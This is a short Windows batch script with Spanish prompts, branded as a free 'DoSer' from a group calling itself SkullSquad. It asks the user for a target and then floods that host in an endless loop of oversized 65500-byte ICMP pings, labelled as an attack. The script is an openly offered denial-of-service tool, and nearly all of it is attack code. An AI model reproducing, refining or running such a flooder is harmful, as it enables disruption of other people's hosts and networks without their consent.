@echo off
title #SkullSquad - FreeTool DoSer By (Infecting)
color 04
echo.
echo.
echo  FREE TOOL  FREE TOOL      
echo   FREE TOOL  FREE TOOL 
echo    FREE TOOL  FREE TOOL 
echo     FREE TOOL  FREE TOOL 
echo      FREE TOOL  FREE TOOL 
echo                                         [ By Infecting ] 
echo          Free Tool By SkullSquad
echo           Free Tool By SkullSquad
echo            Free Tool By SkullSquad
echo             Free Tool By SkullSquad
echo              Free Tool By SkullSquad
echo               Free Tool By SkullSquad
echo                Free Tool By SkullSquad
echo                 Free Tool By SkullSquad
echo                  Free Tool By SkullSquad 
echo -------------------------------------------------
echo        Presiona alguna tecla para seguir 
echo -------------------------------------------------
echo.
echo.
pause >nul
:fnc0
cls
echo           .      #SkullSquad       .        
echo           .      #Infecting        .        
echo           .      #SSQ              .        
echo           .      #SkullHacking     .        
echo           .      #Hacking          .       
echo.
echo.
set /p objdos=Introduce un objetivo para hacer DoS : 
:bucle
ping -l 65500 -n 1 -w 75 %objdos% >nul
echo Enviando paquetes ICMP a : %objdos% - Attacking...
goto bucle
